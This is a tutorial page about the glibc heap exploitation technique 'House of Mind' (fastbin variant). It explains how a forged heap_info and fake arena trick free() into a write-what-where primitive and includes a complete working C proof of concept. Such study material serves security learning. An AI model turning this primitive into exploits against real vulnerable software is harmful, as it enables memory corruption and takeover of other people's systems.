#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Mind",
    description: "An attack that abuses the non-main arena flag and heap alignment to trick free() into using a fake arena, creating a write-what-where primitive.",
    date: "2025-12-28",
    order: 45,
  ),
)<frontmatter>

= House of Mind (Fastbin Variant)

== Introduction

"House of Mind" is a classic heap exploitation technique that targets the multi-arena management system of glibc's `malloc`. The attack tricks the allocator into believing that a chunk belongs to a "non-main arena" that is actually located in memory controlled by the attacker.

By setting the `NON_MAIN_ARENA` flag on a chunk's size and carefully aligning memory, an attacker can force `free()` to look for arena metadata (`malloc_state`) at an arbitrary location. This results in a powerful "write-what-where" primitive when a fastbin chunk is linked into the fake arena's `fastbinsY` array.

== Core Concept: How glibc finds the Arena

When a chunk has the `NON_MAIN_ARENA` (bit 2) set in its size field, glibc uses the following logic to find the arena:

1.  **Heap Info**: glibc assumes that non-main heaps are aligned to `HEAP_MAX_SIZE` (typically 64MB on 64-bit Linux). It finds the `heap_info` struct by masking the chunk's address:
    ```c
    #define heap_for_ptr(ptr) \
      ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1)))
    ```
2.  **Arena Pointer**: The `heap_info` struct contains an `ar_ptr` field which points to the `malloc_state` (the arena) for that heap:
    ```c
    #define arena_for_chunk(ptr) \
      (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)
    ```

By controlling the memory at the `HEAP_MAX_SIZE` aligned boundary, an attacker can provide a fake `ar_ptr` that points to a fake arena.

== Prerequisites
- **Memory Leak**: To know the address of the fake arena.
- **Large Allocation Capability**: Ability to allocate enough memory to reach a `HEAP_MAX_SIZE` aligned boundary.
- **Size Overwrite**: Ability to set the `NON_MAIN_ARENA` bit on a chunk being freed.
- **Tcache Exhaustion**: The tcache for the target size must be full to force the chunk into the fastbin logic.

== Example from `house_of_mind.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main(){
	printf("House of Mind - Fastbin Variant\n");
	
	// Values for the allocation information.	
	int HEAP_MAX_SIZE = 0x4000000;
	int MAX_SIZE = (128*1024) - 0x100;

	// The target location of our attack and the fake arena to use
	uint8_t* fake_arena = malloc(0x1000); 
	uint8_t* target_loc = fake_arena + 0x30;
	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

	// Set 'system_mem' for fake arena to bypass sanity checks
	fake_arena[0x888] = 0xFF;
	fake_arena[0x889] = 0xFF; 
	fake_arena[0x88a] = 0xFF; 

	// Calculate the location where the fake heap_info must reside
	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

	uint64_t* user_mem = malloc(MAX_SIZE);
	
	// Allocate until we reach the HEAP_MAX_SIZE boundary
	while((long long)user_mem < new_arena_value){
		user_mem = malloc(MAX_SIZE);
	}

	// Create victim chunk
	uint64_t* fastbin_chunk = malloc(0x50); // Size 0x60
	uint64_t* chunk_ptr = fastbin_chunk - 2;

	// Fill TCache
	uint64_t* tcache_chunks[7];
	for(int i = 0; i < 7; i++) tcache_chunks[i] = malloc(0x50);
	for(int i = 0; i < 7; i++) free(tcache_chunks[i]);

	// Setup fake heap_info to point to our fake arena
	fake_heap_info[0] = (uint64_t) fake_arena;

	// VULNERABILITY: Set non-main arena bit
	chunk_ptr[1] = 0x60 | 0x4; 

	// Trigger: free the chunk
	free(fastbin_chunk);

	// The address of 'fastbin_chunk' has been written to fake_arena->fastbinsY[offset]
	assert(*((unsigned long *) (target_loc)) != 0);
	return 0;
}
```

== Attack Flow Explained

=== 1. Arena Setup
The attacker creates a `fake_arena` in controlled memory. To pass glibc's sanity checks during `free()`, the `system_mem` field of the fake arena must be a large value.

=== 2. Reaching the Boundary
The attacker allocates memory until the heap reaches a `HEAP_MAX_SIZE` boundary (e.g., a multiple of 64MB). At this specific aligned address, the attacker crafts a `heap_info` struct.

=== 3. Forging the Heap Info
The `fake_heap_info[0]` (the `ar_ptr`) is set to the address of the `fake_arena`. Now, any chunk with the `NON_MAIN_ARENA` bit set that is "near" this boundary will look at this `fake_heap_info` to find its arena.

=== 4. Triggering the Write
When `free(fastbin_chunk)` is called:
1. glibc sees the `NON_MAIN_ARENA` bit.
2. It calculates the `heap_info` address by masking `fastbin_chunk`.
3. It retrieves `ar_ptr` from our `fake_heap_info`, which points to `fake_arena`.
4. It identifies the chunk as a fastbin-sized chunk.
5. It attempts to link the chunk into `fake_arena->fastbinsY[index]`.

This results in the address of `fastbin_chunk` being written into the `fake_arena` at an offset determined by the chunk's size. By carefully choosing the `fake_arena` base address and the chunk size, the attacker can write a heap pointer to an arbitrary memory location.
